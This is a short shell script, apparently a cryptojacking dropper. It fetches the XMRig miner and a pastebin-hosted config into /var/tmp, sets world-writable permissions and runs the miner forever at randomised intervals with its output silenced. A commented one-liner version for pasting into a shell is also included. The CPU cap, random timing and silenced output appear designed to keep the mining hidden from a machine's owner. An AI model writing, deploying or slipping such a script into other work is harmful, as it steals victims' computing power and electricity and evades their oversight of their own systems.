#!/bin/sh
curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
curl -o /var/tmp/config.json https://pastebin.com/raw/yFNigSAC #29% cpu cap 
chmod 777 /var/tmp/xmrig
cd /var/tmp
tar -xvf xmrig
cp xmrig-6.14.0/xmrig ./xmrig
while true :
  do
    t=$(($RANDOM % (3600-600+1) ))
    timeout $(($t+600)) ./xmrig -c config.json > /dev/null 2>&1
    sleep $(($t+900))
done

    
# online 
# #!/bin/sh
# curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz;curl -o /var/tmp/config.json https://pastebin.com/raw/Q3et6dUV;chmod 777 /var/tmp/xmrig;cd /var/tmp;tar -xvf xmrig;cp xmrig-6.14.0/xmrig ./xmrig;while true;do timeout $(($(($RANDOM%(3600-600+1)))+600)) ./xmrig -c config.json > /dev/null 2>&1;sleep $(($(($RANDOM%(5000-600+1)))+600));done

    